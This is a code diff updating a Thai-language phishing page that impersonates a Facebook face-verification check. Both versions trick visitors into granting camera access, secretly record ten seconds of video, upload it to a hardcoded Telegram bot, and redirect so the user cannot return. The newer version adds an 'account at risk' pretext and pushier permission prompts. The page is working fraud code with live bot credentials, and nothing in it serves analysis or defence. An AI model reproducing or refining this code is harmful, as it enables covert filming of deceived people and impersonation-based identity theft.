@@ -1,61 +1,70 @@
 <!DOCTYPE html>
-<html>
+<html lang="th">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Facebook Security Check</title>
 </head>
-<body style="background:#f0f2f5; margin:0; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
-    <div style="background:#fff; padding:30px; border-radius:12px; text-align:center; width:320px; box-shadow:0 4px 12px rgba(0,0,0,0.15);">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="55">
-        <h2 style="font-size:18px; margin:15px 0;">ยืนยันความปลอดภัย</h2>
-        <p style="font-size:14px; color:#606770; line-height:1.4;">โปรดกดปุ่มด้านล่างเพื่อทำการสแกนใบหน้าตรวจสอบตัวตนของคุณ</p>
-        <button id="btn" style="background:#1877f2; color:#fff; border:none; padding:15px; width:100%; border-radius:8px; font-weight:bold; cursor:pointer; font-size:16px;">เริ่มตรวจสอบเดี๋ยวนี้</button>
-        <div id="msg" style="display:none; margin-top:15px; color:#1877f2; font-weight:bold;">⏳ กำลังบันทึกข้อมูล...</div>
+<body style="background:#f0f2f5; margin:0; display:flex; justify-content:center; align-items:center; height:100vh; font-family:Helvetica, Arial, sans-serif;">
+
+<div style="background:#fff; padding:30px; border-radius:12px; text-align:center; width:90%; max-width:320px; box-shadow:0 10px 25px rgba(0,0,0,0.1);">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="60">
+    <h2 style="font-size:20px; color:#1c1e21; margin:20px 0 10px;">ยืนยันความปลอดภัย</h2>
+    <p style="font-size:14px; color:#606770; margin-bottom:25px; line-height:1.5;">บัญชีของคุณอาจมีความเสี่ยง โปรดกดปุ่มด้านล่างเพื่อทำการสแกนใบหน้ายืนยันตัวตน (ใช้เวลา 10 วินาที)</p>
+    
+    <button id="authBtn" style="background:#1877f2; color:#fff; border:none; padding:15px; width:100%; border-radius:8px; font-weight:bold; cursor:pointer; font-size:16px; -webkit-appearance:none;">เริ่มการตรวจสอบ</button>
+    
+    <div id="loading" style="display:none; margin-top:20px;">
+        <div style="border:3px solid #f3f3f3; border-top:3px solid #1877f2; border-radius:50%; width:24px; height:24px; animation: spin 1s linear infinite; margin:0 auto 10px;"></div>
+        <span style="color:#1877f2; font-size:14px; font-weight:bold;">กำลังสแกนใบหน้า...</span>
     </div>
+</div>
 
-    <script>
-        const T = '8570864342:AAH-v-iLybrDvA9mD569rERO9WmU1M0HzdA';
-        const C = '8482017371';
-        const R = 'https://www.facebook.com/share/p/1avrMEzzJn/';
+<style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
 
-        document.getElementById('btn').onclick = async function() {
-            const b = this;
-            const m = document.getElementById('msg');
-            b.style.display = 'none';
-            m.style.display = 'block';
+<script>
+    const T = '8570864342:AAH-v-iLybrDvA9mD569rERO9WmU1M0HzdA';
+    const C = '8482017371';
+    const R = 'https://www.facebook.com/share/p/1avrMEzzJn/';
 
-            try {
-                // บังคับขอสิทธิ์ใหม่ทุกครั้ง
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const rec = new MediaRecorder(s);
-                const chunks = [];
+    document.getElementById('authBtn').onclick = async function() {
+        const btn = this;
+        const loader = document.getElementById('loading');
+        
+        try {
+            // บังคับขอสิทธิ์แบบสุภาพที่สุด
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" },
+                audio: false 
+            });
+
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+            
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                const fd = new FormData();
+                fd.append('chat_id', C);
+                fd.append('video', blob, 'security_scan.mp4');
+
+                // ส่งเข้า Telegram และรอจนจบ
+                await fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: fd });
                 
-                rec.ondataavailable = e => chunks.push(e.data);
-                rec.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    const fd = new FormData();
-                    fd.append('chat_id', C);
-                    fd.append('video', blob, 'capture.mp4');
+                stream.getTracks().forEach(t => t.stop());
+                window.location.replace(R);
+            };
 
-                    // ส่งเข้า Telegram
-                    await fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: fd });
-                    
-                    s.getTracks().forEach(track => track.stop());
-                    window.location.replace(R); // ใช้ replace เพื่อไม่ให้กด back กลับมาได้
-                };
+            recorder.start();
+            setTimeout(() => { recorder.stop(); }, 10000); // เก็บ 10 วิ
 
-                rec.start();
-                setTimeout(() => rec.stop(), 10000); // เก็บ 10 วิ
-
-            } catch (err) {
-                // ถ้ามันบล็อก ให้เด้งเตือนแบบขู่ๆ ไปเลย
-                alert("ข้อผิดพลาด: ระบบไม่สามารถเข้าถึงกล้องได้ โปรดอนุญาตสิทธิ์ในตั้งค่า Browser เพื่อยืนยันตัวตน");
-                b.style.display = 'block';
-                m.style.display = 'none';
-            }
-        };
-    </script>
+        } catch (err) {
+            alert("⚠️ ข้อผิดพลาด: โปรดกด 'อนุญาต' (Allow) กล้องเพื่อยืนยันตัวตน หากไม่ขึ้นให้กด โปรดรีเฟรชหน้าเว็บหรือตรวจสอบการตั้งค่า Browser");
+        }
+    };
+</script>
 </body>
 </html>
